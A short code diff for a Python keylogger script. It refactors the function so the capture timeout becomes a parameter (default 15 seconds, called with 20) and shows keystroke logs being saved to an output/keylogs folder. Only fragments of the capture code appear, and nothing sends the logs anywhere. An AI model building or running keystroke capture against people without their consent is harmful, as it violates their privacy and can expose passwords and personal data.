@@ -17,8 +17,7 @@ def keylog_action(source_dir, log_dir, filename):
         listener.join()
 
 
-def keylog():
-    timeout_seconds = 15
+def keylog(timeout_seconds=15):
     source_dir = os.path.dirname(os.path.abspath(__file__))
     log_dir = os.path.join(source_dir, "..\\output\\keylogs\\")
     os.makedirs(log_dir, exist_ok=True)
@@ -40,7 +39,7 @@ def keylog():
 
 
 def main():
-    path = keylog()
+    path = keylog(20)
     print(path)
 
 
